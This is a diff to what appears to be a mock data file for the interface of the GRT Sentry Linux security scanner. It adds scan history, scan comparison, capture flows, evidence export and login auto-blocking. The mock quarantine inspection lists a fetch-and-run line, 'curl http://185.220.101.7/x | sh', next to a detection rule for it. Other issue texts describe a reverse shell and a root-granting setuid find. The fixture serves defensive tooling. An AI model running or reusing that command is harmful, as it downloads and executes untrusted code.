@@ -11,22 +11,24 @@ const status = {
   files_checked: 1204,
   active_connections: 14,
   queued_files: 37,
+  new_issues: 2,
+  scan_id: 12,
   issues: [
     {
       id: "a", kind: "malicious_file", severity: "critical",
-      title: "Malicious file: flagged by 34 engines",
+      title: "Malicious file: flagged by 34 engines", first_seen: now - 120, times_seen: 1, set_aside: false,
       location: "/home/user/Downloads/setup_installer.exe",
       detail: "34 of 71 engines call this file malicious. At this level it is not a difference of opinion between scanners.",
       actions: [
         { id: "quarantine", label: "Quarantine", destructive: false },
         { id: "delete", label: "Delete", destructive: true },
         { id: "trust", label: "Trust this file", destructive: false },
-        { id: "ignore", label: "Ignore", destructive: false },
+        { id: "ignore", label: "Set aside", destructive: false },
       ],
     },
     {
       id: "b", kind: "suspicious_connection", severity: "warning",
-      title: "Connection to an address seen for the first time",
+      title: "Connection to an address seen for the first time", first_seen: now - 120, times_seen: 1, set_aside: false,
       location: "node (pid 4821) to 185.220.101.7:9001",
       detail: "The address is announced from Amsterdam, Netherlands (52.37, 4.89). That is where the network routing the connection is registered, not where a person is.\nPort 9001 is not one of the ports everyday software normally uses.",
       actions: [
@@ -34,19 +36,19 @@ const status = {
         { id: "block_ip", label: "Block address", destructive: true },
         { id: "kill_process", label: "Stop process", destructive: true },
         { id: "trust", label: "Trust", destructive: false },
-        { id: "ignore", label: "Ignore", destructive: false },
+        { id: "ignore", label: "Set aside", destructive: false },
       ],
     },
     {
       id: "d", kind: "rule_match", severity: "critical",
-      title: "Reverse shell, inside the archive",
+      title: "Reverse shell, inside the archive", first_seen: now - 300000, times_seen: 6, set_aside: false,
       location: "/home/user/Downloads/tools.zip",
       detail: "Reverse shell, in tools/update.sh. Starts an interactive shell and connects it to a remote address, which hands control of this account to whoever is listening there.\nSHA-256 of that file: ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
       actions: [
         { id: "quarantine", label: "Quarantine", destructive: false },
         { id: "delete", label: "Delete", destructive: true },
         { id: "trust", label: "Trust this file", destructive: false },
-        { id: "ignore", label: "Ignore", destructive: false },
+        { id: "ignore", label: "Set aside", destructive: false },
       ],
     },
     {
@@ -56,17 +58,27 @@ const status = {
       detail: "It was installed by the package openssh-server, and its contents no longer match what the package put there.\n\nThe package manager can confirm it on its own:\n\n    sudo dpkg --verify openssh-server",
       actions: [
         { id: "update_baseline", label: "This was expected", destructive: false },
-        { id: "ignore", label: "Ignore", destructive: false },
+        { id: "ignore", label: "Set aside", destructive: false },
       ],
     },
     {
       id: "f", kind: "special_permission", severity: "critical",
-      title: "/usr/bin/find gives root to anyone who runs it",
+      title: "/usr/bin/find gives root to anyone who runs it", first_seen: now - 900000, times_seen: 14, set_aside: true,
       location: "/usr/bin/find",
       detail: "/usr/bin/find carries set-user-ID root. It is a program that can be asked to start a shell or write any file, so with that bit anyone on this machine becomes root by running it.",
       actions: [
         { id: "trust", label: "Expected", destructive: false },
-        { id: "ignore", label: "Ignore", destructive: false },
+        { id: "ignore", label: "Set aside", destructive: false },
+      ],
+    },
+    {
+      id: "g", kind: "failed_login_attempts", severity: "warning",
+      title: "Block the 2 addresses that keep trying to log in", first_seen: now - 120, times_seen: 1, set_aside: false,
+      location: "Automatic response",
+      detail: "These went over 10 failed logins in the last 24 hours:\n  185.220.101.33, 212 failures\n  45.155.205.9, 31 failures\n\nOne button blocks them all, with one password. Each block lifts after 24 hours, or sooner from the action log.",
+      actions: [
+        { id: "block_all", label: "Block for 24 hours", destructive: false },
+        { id: "ignore", label: "Set aside", destructive: false },
       ],
     },
     {
@@ -74,7 +86,7 @@ const status = {
       title: "No VirusTotal API key is set",
       location: "GRT Sentry",
       detail: "Files were checked against GRT Sentry's own rules only, and not against VirusTotal's engines.",
-      actions: [{ id: "ignore", label: "Ignore", destructive: false }],
+      actions: [{ id: "ignore", label: "Set aside", destructive: false }],
     },
   ],
 };
@@ -117,10 +129,10 @@ const responses = {
     auto_quarantine: false, auto_quarantine_threshold: 10,
     vt_interval_seconds: 15, vt_budget_per_scan: 40, connection_refresh_seconds: 0, watch_folders: false,
     integrity_paths: ["/etc/passwd", "/etc/hosts"], auth_log_path: "/var/log/auth.log",
-    failed_login_threshold: 5, scan_on_startup: true, theme: "system",
+    failed_login_threshold: 5, auto_block: true, auto_block_after: 10, scan_on_startup: true, theme: "system",
   },
   system_info: {
-    version: "0.1.0", system: "Linux",
+    version: "0.4.0", system: "Linux",
     geoip_available: true, geoip_path: "/usr/share/grt-sentry/GeoLite2-City.mmdb",
     elevation_available: true, elevation_note: "pkexec", elevated: false,
     firewall_available: true, firewall_note: "nftables, through scripts/setup-nftables.sh",
@@ -134,6 +146,42 @@ const responses = {
     schedule: { installed: true, enabled: true, frequency: "daily", next_run: "Tue 03:00", supported: true },
     watched_folders: [],
   },
+  list_scans: [
+    { id: 12, timestamp: now - 120, files_checked: 1204, issues_found: 6 },
+    { id: 11, timestamp: now - 86400, files_checked: 1190, issues_found: 4 },
+    { id: 10, timestamp: now - 172800, files_checked: 1187, issues_found: 4 },
+  ],
+  scan_report: "GRT Sentry 0.4.0, scan of 2026-11-06 14:03\n\n1204 files checked. 5 things need attention, 2 of them new. 1 set aside, 1 notes.\n\nNeeds attention\n---------------\n\nCRITICAL  Malicious file: flagged by 34 engines\n          /home/user/Downloads/setup_installer.exe\n          new in this scan\n",
+  compare_scans: {
+    older: { id: 11, timestamp: now - 86400, files_checked: 1190, issues_found: 4 },
+    newer: { id: 12, timestamp: now - 120, files_checked: 1204, issues_found: 6 },
+    appeared: [
+      { fingerprint: "a", kind: "malicious_file", severity: "critical", title: "Malicious file: flagged by 34 engines", location: "/home/user/Downloads/setup_installer.exe", detail: null, first_seen: now - 120, times_seen: 1, set_aside: false },
+    ],
+    gone: [
+      { fingerprint: "z", kind: "suspicious_process", severity: "warning", title: "curl runs from a temporary folder", location: "curl (pid 3301)", detail: null, first_seen: now - 90000, times_seen: 3, set_aside: false },
+    ],
+    unchanged: 4,
+  },
+  inspect_quarantined: {
+    size: 48213, kind: "Linux program (ELF), 64-bit, x86-64", disguise: "The name ends in .pdf, but the contents say: Linux program (ELF), 64-bit, x86-64.",
+    sha256: "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", md5: "900150983cd24fb0d6963f7d28e17f72",
+    entropy: 7.82, strings: ["/lib64/ld-linux-x86-64.so.2", "curl http://185.220.101.7/x | sh", "GLIBC_2.34"], strings_total: 3,
+    notable: ["curl http://185.220.101.7/x | sh"],
+    hits: [{ rule: "dropper_curl_pipe_shell", severity: "warning", title: "Downloads and runs a script", detail: "" }],
+    members: 0, unchecked: [],
+  },
+  read_capture: {
+    packets: 18233, other: 41, flow_count: 64, note: null, added: 1,
+    flows: [
+      { from: "192.168.1.20", to: "185.220.101.7", protocol: "tcp", port: 443, packets: 812, bytes: 1203311, first: now - 4000, last: now - 3000, indicator: "known command server", flagged: "185.220.101.7" },
+      { from: "192.168.1.20", to: "1.1.1.1", protocol: "udp", port: 53, packets: 120, bytes: 14210, first: now - 4000, last: now - 3000, indicator: null, flagged: null },
+    ],
+  },
+  export_evidence: "Saved to /home/user/grt-sentry-evidence-2026-11-06.zip, with one file encrypted as infected.",
+  export_quarantine_evidence: "Saved to /home/user/grt-sentry-evidence-2026-11-06.zip, with one file encrypted as infected.",
+  export_report: "Saved to /home/user/grt-sentry-report-2026-11-06.txt.",
+  export_comparison: "Saved to /home/user/grt-sentry-changes-2026-11-06.txt.",
   close_connection: "The connection to 185.220.101.7:443 is closed.",
   resolve_issue: "Done.",
   set_config: null,
@@ -149,5 +197,10 @@ window.__TAURI__ = {
     },
   },
   event: { listen: () => Promise.resolve(() => {}) },
-  dialog: { open: () => Promise.resolve(null), ask: () => Promise.resolve(true), message: () => Promise.resolve() },
+  dialog: {
+    open: () => Promise.resolve(window.__open || null),
+    save: (options) => Promise.resolve(`/home/user/${options.defaultPath}`),
+    ask: () => Promise.resolve(true),
+    message: () => Promise.resolve(),
+  },
 };
